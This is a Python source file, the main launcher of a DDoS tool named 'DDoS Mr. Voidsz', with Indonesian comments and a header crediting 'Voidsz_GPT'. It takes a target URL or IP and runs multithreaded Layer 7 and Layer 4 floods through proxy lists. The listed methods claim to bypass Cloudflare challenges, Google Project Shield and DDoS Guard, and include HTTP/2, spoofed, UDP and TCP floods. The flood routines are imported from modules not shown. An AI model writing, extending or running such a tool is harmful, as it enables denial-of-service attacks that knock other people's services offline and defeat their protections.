#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
DDoS Mr. Voidsz - Ultimate Layer 7/4 Attack Tool
Created by Voidsz_GPT
"""

import sys
import os
import time
import random
import threading
import socket
import ssl
import requests
import urllib3
from concurrent.futures import ThreadPoolExecutor
from colorama import init, Fore, Style

# Tambahkan path core ke sys.path
sys.path.append(os.path.join(os.path.dirname(__file__), 'core'))

from core.layer7 import Layer7Attacker
from core.layer4 import Layer4Attacker
from core.proxy_engine import ProxyEngine
from core.utils import (
    print_banner, 
    validate_url, 
    validate_ip, 
    get_random_useragent,
    get_random_proxy,
    loading_animation
)

init(autoreset=True)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class DDoSMrVoidsz:
    def __init__(self):
        self.active_attacks = []
        self.is_attacking = False
        self.attack_threads = []
        
    def print_methods(self):
        """Menampilkan semua metode attack yang tersedia"""
        methods = {
            "Layer 7": {
                "cfb": "Bypass CF attack",
                "pxcfb": "Bypass CF attack with proxy",
                "cfreq": "Bypass CF UAM, CAPTCHA, BFM, etc,, with request",
                "cfsoc": "Bypass CF UAM, CAPTCHA, BFM, etc,, with socket",
                "pxsky": "Bypass Google Project Shield, Vshield, DDoS Guard Free, CF NoSec With Proxy",
                "sky": "Sky method without proxy",
                "http2": "HTTP 2.0 Request Attack",
                "pxhttp2": "HTTP 2.0 Request Attack With Proxy",
                "spoof": "Spoof Attack",
                "pxspoof": "Spoof Attack with Proxy",
                "get": "Get Request Attack",
                "post": "Post Request Attack",
                "head": "Head Request Attack",
                "soc": "Socket Attack",
                "pxraw": "Proxy Request Attack",
                "pxsoc": "Proxy Socket Attack"
            },
            "Layer 4": {
                "udp": "UDP Flood Attack",
                "tcp": "TCP Flood Attack"
            }
        }
        
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"{Fore.YELLOW}DAFTAR METODE ATTACK DDoS Mr. Voidsz")
        print(f"{Fore.CYAN}{'='*60}")
        
        for layer, layer_methods in methods.items():
            print(f"\n{Fore.GREEN}[{layer.upper()}]")
            for method, desc in layer_methods.items():
                print(f"  {Fore.WHITE}- {method:<12} | {Fore.CYAN}{desc}")
        
        print(f"\n{Fore.CYAN}{'='*60}")
        
    def start_attack(self, target, method, threads, duration, proxy_file=None):
        """Memulai serangan"""
        print(f"\n{Fore.YELLOW}[*] Memulai attack...")
        print(f"{Fore.WHITE}Target    : {Fore.RED}{target}")
        print(f"{Fore.WHITE}Method    : {Fore.GREEN}{method}")
        print(f"{Fore.WHITE}Threads   : {Fore.CYAN}{threads}")
        print(f"{Fore.WHITE}Duration  : {Fore.MAGENTA}{duration}s")
        
        self.is_attacking = True
        start_time = time.time()
        end_time = start_time + duration
        
        # Inisialisasi attacker
        if method in ['udp', 'tcp']:
            attacker = Layer4Attacker(target, method)
        else:
            attacker = Layer7Attacker(target, method, proxy_file)
        
        # Jalankan threads
        for i in range(threads):
            t = threading.Thread(
                target=self._attack_worker,
                args=(attacker, method, end_time),
                daemon=True
            )
            t.start()
            self.attack_threads.append(t)
        
        # Progress bar
        self._show_progress(start_time, end_time)
        
        # Tunggu semua thread selesai
        for t in self.attack_threads:
            t.join()
            
        self.is_attacking = False
        print(f"\n{Fore.GREEN}[+] Attack selesai!")
        
    def _attack_worker(self, attacker, method, end_time):
        """Worker thread untuk attack"""
        while time.time() < end_time and self.is_attacking:
            try:
                if hasattr(attacker, method):
                    getattr(attacker, method)()
                time.sleep(0.01)
            except Exception as e:
                continue
                
    def _show_progress(self, start_time, end_time):
        """Menampilkan progress bar"""
        while time.time() < end_time and self.is_attacking:
            elapsed = time.time() - start_time
            total = end_time - start_time
            progress = (elapsed / total) * 100
            
            bar_length = 40
            filled_length = int(bar_length * progress // 100)
            bar = '█' * filled_length + '░' * (bar_length - filled_length)
            
            print(f"\r{Fore.CYAN}[{bar}] {progress:.1f}% | Time: {elapsed:.1f}s", end='')
            time.sleep(0.5)
        
        print()
        
    def interactive_mode(self):
        """Mode interaktif"""
        print_banner()
        
        while True:
            try:
                print(f"\n{Fore.YELLOW}[?] Pilihan:")
                print(f"{Fore.WHITE}1. Tampilkan metode attack")
                print(f"{Fore.WHITE}2. Mulai attack")
                print(f"{Fore.WHITE}3. Test proxy")
                print(f"{Fore.WHITE}4. Generate proxy list")
                print(f"{Fore.WHITE}5. Keluar")
                
                choice = input(f"\n{Fore.GREEN}[+] Pilih (1-5): ").strip()
                
                if choice == '1':
                    self.print_methods()
                    
                elif choice == '2':
                    # Input target
                    target = input(f"{Fore.GREEN}[+] Masukkan target URL/IP: ").strip()
                    
                    # Validasi target
                    if not (target.startswith('http') or validate_ip(target.split(':')[0])):
                        print(f"{Fore.RED}[!] Target tidak valid!")
                        continue
                    
                    # Input method
                    method = input(f"{Fore.GREEN}[+] Masukkan metode attack: ").strip().lower()
                    
                    # Input threads
                    try:
                        threads = int(input(f"{Fore.GREEN}[+] Jumlah threads (default 500): ").strip() or "500")
                    except:
                        threads = 500
                    
                    # Input duration
                    try:
                        duration = int(input(f"{Fore.GREEN}[+] Durasi (detik): ").strip())
                    except:
                        duration = 60
                    
                    # Proxy file
                    proxy_file = None
                    use_proxy = input(f"{Fore.GREEN}[+] Gunakan proxy? (y/n): ").strip().lower()
                    if use_proxy == 'y':
                        proxy_file = "data/proxies.txt"
                        if not os.path.exists(proxy_file):
                            print(f"{Fore.YELLOW}[*] Generating proxy list...")
                            ProxyEngine.generate_proxy_list(100, proxy_file)
                    
                    # Konfirmasi
                    print(f"\n{Fore.RED}[!] KONFIRMASI ATTACK")
                    print(f"{Fore.WHITE}Target   : {target}")
                    print(f"{Fore.WHITE}Method   : {method}")
                    print(f"{Fore.WHITE}Threads  : {threads}")
                    print(f"{Fore.WHITE}Duration : {duration}s")
                    
                    confirm = input(f"\n{Fore.RED}[?] Lanjutkan attack? (y/n): ").strip().lower()
                    if confirm == 'y':
                        self.start_attack(target, method, threads, duration, proxy_file)
                        
                elif choice == '3':
                    proxy_file = "data/proxies.txt"
                    if os.path.exists(proxy_file):
                        ProxyEngine.test_proxies(proxy_file)
                    else:
                        print(f"{Fore.RED}[!] File proxy tidak ditemukan!")
                        
                elif choice == '4':
                    try:
                        count = int(input(f"{Fore.GREEN}[+] Jumlah proxy: ").strip())
                        ProxyEngine.generate_proxy_list(count, "data/proxies.txt")
                    except:
                        print(f"{Fore.RED}[!] Input tidak valid!")
                        
                elif choice == '5':
                    print(f"{Fore.YELLOW}[*] Keluar...")
                    sys.exit(0)
                    
            except KeyboardInterrupt:
                print(f"\n{Fore.YELLOW}[*] Dihentikan oleh user")
                self.is_attacking = False
                break
            except Exception as e:
                print(f"{Fore.RED}[!] Error: {e}")

def main():
    """Main function"""
    try:
        tool = DDoSMrVoidsz()
        
        if len(sys.argv) > 1:
            # Command line mode
            if sys.argv[1] == "--methods":
                tool.print_methods()
            elif sys.argv[1] == "--attack":
                if len(sys.argv) < 6:
                    print(f"{Fore.RED}[!] Usage: python main.py --attack <target> <method> <threads> <duration> [proxy_file]")
                    return
                
                target = sys.argv[2]
                method = sys.argv[3]
                threads = int(sys.argv[4])
                duration = int(sys.argv[5])
                proxy_file = sys.argv[6] if len(sys.argv) > 6 else None
                
                tool.start_attack(target, method, threads, duration, proxy_file)
            else:
                print(f"{Fore.RED}[!] Command tidak dikenali!")
                print(f"{Fore.WHITE}Gunakan: python main.py --methods")
                print(f"{Fore.WHITE}Atau   : python main.py --attack <target> <method> <threads> <duration>")
        else:
            # Interactive mode
            tool.interactive_mode()
            
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[*] Program dihentikan")
    except Exception as e:
        print(f"{Fore.RED}[!] Fatal error: {e}")

if __name__ == "__main__":
    main()